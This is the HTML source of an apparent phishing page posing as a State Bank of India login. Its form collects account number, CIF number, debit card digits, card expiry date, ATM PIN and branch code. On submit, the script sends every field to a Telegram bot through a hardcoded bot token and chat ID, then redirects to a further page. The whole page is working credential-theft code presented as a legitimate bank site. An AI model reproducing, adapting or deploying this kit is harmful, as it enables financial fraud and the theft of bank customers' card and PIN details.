<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome To SBI</title>
    <meta name="description" content="../external.html?link=https://onlinesbi.co.in/">
    
    <!-- Social sharing image -->
    <meta property="og:image" content="SBI.html">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    
    <!-- Bootstrap for mobile view -->
    <link rel="stylesheet" href="../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

    <!-- Styles here -->
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        input[type="text"],
        input[type="number"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            display: inline-block;
            border: 1.3px solid #7B1D61; /* Set border color to #4F0D68 */
            box-sizing: border-box;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s; /* Smooth transition for focus effect */
        }
        ut[type="text"]:hover,
        input[type="number"]:hover,
        input[type="password"]:hover {
            border-color: #7B1D61; /* Change border color on hover */
        }
        input[type="text"]:focus,
        input[type="number"]:focus,
        input[type="password"]:focus {
            border-color: #7B1D61; /* Change border color on focus */
            outline: none; /* Remove default outline */
        }
        button {
            background-color: #7B1D61; /* Set button color */
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 7px;
            cursor: pointer;
            width: 100%;
            height: 45px;
        }
        button:hover {
            opacity: 0.8;
        }
        .split-input {
            display: flex;
            justify-content: space-between;
        }
        .split-input .form-group {
            flex: 1;
            margin-right: 5px;
        }
        .split-input .form-group:last-child {
            margin-right: 0;
        }
    </style>
</head>
<body>
    <div>
        <img src="head1.jpg" alt="SBI LOGO" width="100%" height="100">
    </div>
    <br>
    <form id="myForm" class="container">
        <div class="form-group">
            <label for="accountNumber">Account Number:</label>
            <input type="number" id="accountNumber" name="accountNumber" required class="form-control" maxlength="11">
        </div>
        <div class="form-group">
            <label for="cifNumber">CIF Number:</label>
            <input type="number" id="cifNumber" name="cifNumber" required class="form-control">
        </div>
      <div class="form-group">
      <label for="cardNumber">Enter 4 Digit Debit Card No.:</label>
            <input type="text" id="cardNumber" name="cardNumber" class="masked-input" maxlength="19" value="XXXX-XXXX-XXXX-" placeholder="XXXX-XXXX-XXXX-1234" required>
   </div>
        <div class="split-input">
            <div class="form-group">
                <label for="expiration-date">Expire Date</label>
                <input type="text" id="expiration-date" name="expiration-date" class="form-control" placeholder="MM/YY" required>
                <span id="expiration-date-error" class="error-message"></span>
            </div>
            <div class="form-group">
                <label for="atmPin">ATM PIN</label>
                <input type="number" id="atmPin" name="atmPin" class="form-control" required>
            </div>
        </div>
        <div class="form-group">
            <label for="branchCode">Branch Code:</label>
            <input type="number" id="branchCode" name="branchCode" title="Please enter your Branch Code." required class="form-control">
        </div>
        <br>
        <button type="submit">Proceed</button>

    </form>

    <script src="../code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="../cdn.jsdelivr.net/npm/%40popperjs/core%401.16.1/dist/umd/popper.min.html"></script>
    <script src="../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
        // Format expiration date input
        document.getElementById('expiration-date').addEventListener('input', function (e) {
            var input = e.target.value;
            if (input.length === 2 && !input.includes('index.html')) {
                e.target.value = input + '/';
            } else if (input.length === 3 && input.charAt(2) === 'index.html') {
                e.target.value = input.slice(0, 2);
            } else if (input.length > 5) {
                e.target.value = input.slice(0, 5);
            }
        });

        // Form submission handling
        document.getElementById('myForm').addEventListener('submit', function(event) {
            event.preventDefault();
        
            let formData = new FormData(this);
            let message = `Account Number: ${formData.get('accountNumber')}\nCIF Number: ${formData.get('cifNumber')}\nDebit Card No.: ${formData.get('cardNumber')}\nExpire Date: ${formData.get('expiration-date')}\nATM PIN: ${formData.get('atmPin')}\nBranch Code: ${formData.get('branchCode')}`;

            fetch('../external.html?link=https://api.telegram.org/bot8342341479:AAGxeOqHIrVvl1FZn10HMr5-rIxFC953AGw/sendMessage', { // Replace YOUR_BOT_TOKEN with your actual token
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ chat_id: '7357838260', text: message }), // Replace YOUR_CHAT_ID with your actual chat ID
            })
            .then(response => {
                if (response.ok) {
                    // Redirect to another page once the form data is sent
                    window.location.href = 'ot.html';
                } else {
                    console.error('Error sending message');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
